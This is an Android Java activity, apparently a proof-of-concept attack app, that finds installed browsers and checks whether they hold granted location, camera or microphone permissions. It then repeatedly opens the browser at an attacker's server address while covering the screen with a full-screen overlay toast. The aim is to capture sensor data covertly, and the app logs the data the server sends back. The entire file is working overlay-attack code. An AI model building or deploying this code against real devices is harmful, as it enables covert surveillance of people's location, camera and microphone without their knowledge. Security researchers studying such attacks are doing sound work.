package com.example.attacker;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Trace;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import static com.example.attacker.R.layout.blocking_screen;

import java.util.ArrayList;
import java.util.List;

public class SendReceiveActivity extends AppCompatActivity {

    private Handler mHandler;
    private Runnable mRunnable;
    private static boolean launchedBrowser = false;
    private static String launchedUrl = null;
    private static String browserName = "com.android.chrome";



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.malicious_layout);
        Log.i("Clicked", "SomeActivity came up");


        // Initialize the handler and runnable
        // mHandler = new Handler(Looper.getMainLooper());
        mHandler = new Handler();
        mRunnable = new Runnable() {
            @Override
            public void run() {
                updateUI();
                if (!launchedBrowser) {
                    try {
                        long delayedTime = 300;
                        try {
                            Thread.sleep(delayedTime);
                            browserLaunch();
                        } catch (InterruptedException e) {
                            throw new RuntimeException(e);
                        }
                        launchedBrowser = true;
                    } catch (Exception e) {
                        Log.e("FailedToLaunch", e.toString());
                    }

                }
            }
        };

        //searching browsers
        List<String> browserNames = new ArrayList<>();
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        intent.addCategory(Intent.CATEGORY_DEFAULT);
        intent.addCategory(Intent.CATEGORY_BROWSABLE);
        intent.setData(Uri.parse("http://www.google.com"));
        List<ResolveInfo> list = null;
        PackageManager pm = getPackageManager();
        list = pm.queryIntentActivities(intent, PackageManager.MATCH_ALL);
        for (ResolveInfo info: list) {
            String browserName = info.activityInfo.packageName;
            browserNames.add(browserName);
            Log.i("browserName", browserName);
        }

        //sniffing
        String packageName = browserName; // get it from browserNames (for example, we use chrome)
        PackageInfo packageInfo = null;
        try {
            packageInfo = pm.getPackageInfo(packageName, PackageManager.GET_PERMISSIONS);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        String[] permissions = packageInfo.requestedPermissions;

        boolean locationPermissionOn = false;
        boolean cameraPermissionOn = false;
        boolean microphonePermissionOn = false;

        if (permissions != null && permissions.length > 0) {
            for (String permissioName : permissions) {
                //replace with the package name of the browser app

                int permissionStatus = pm.checkPermission(permissioName, packageName);
                if (permissionStatus == PackageManager.PERMISSION_GRANTED) {
                    // permission is granted
                    Log.i("permissions_granted", permissioName);
                    if (permissioName.equals("android.permission.ACCESS_COARSE_LOCATION")) { // location
                        locationPermissionOn = true;
                    }

                    if (permissioName.equals("android.permission.CAMERA")) {
                        cameraPermissionOn = true;
                    } // camera

                    if (permissioName.equals("android.permission.RECORD_AUDIO")) {
                        microphonePermissionOn = true;
                    }

                } else {
                    // permission is not granted
                    Log.i("permissions_not_granted", permissioName);
                }
            }
        }

        // launch attack
        if(locationPermissionOn) {
            launchedUrl = "172.16.1.73/location.html";
            startPeriodicTask();
        }
        else if(cameraPermissionOn) {
            launchedUrl = "172.16.1.73/camera.html";
            startPeriodicTask();
        }
        else if (microphonePermissionOn) {
            launchedUrl = "172.16.1.73/microphone.html";
            startPeriodicTask();
        }

    }


    // Start the periodic task from the worker thread
    private void startPeriodicTask() {
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i =0 ; i<5; i++) {
                    mHandler.post(mRunnable);
                    try {
                        Thread.sleep(275); //275 215 220 365
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        thread.start();
    }

    private void browserLaunch() {
        String urlConfig = launchedUrl; //"192.168.8.149";
        String url = "https://" + urlConfig;
        Intent attackersIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        attackersIntent.setPackage(browserName); //set browser name dynamically before launching
        startActivity(attackersIntent);
    }


    @SuppressLint("ResourceType")
    public void updateUI() {

        Toast ransomeToast = new Toast(getBaseContext());
        ransomeToast.setGravity(Gravity.FILL,0,0);

        ransomeToast.setView(LayoutInflater.from(getBaseContext()).inflate(blocking_screen, null));
        ransomeToast.setDuration(Toast.LENGTH_LONG);
        ransomeToast.show();
        finishAffinity();

    }

    @Override
    protected void onResume() {
        super.onResume();
        handleIntetExtras(getIntent());
    }


    private void handleIntetExtras(Intent intent) {

        Uri uri = intent.getData();
        if(uri != null) {
            Log.i("Server_Response", "received some data");
            Log.i("Device_Data", uri.getQuery());

            Toast.makeText(this, uri.getQuery(), Toast.LENGTH_LONG).show();

        }
    }


}
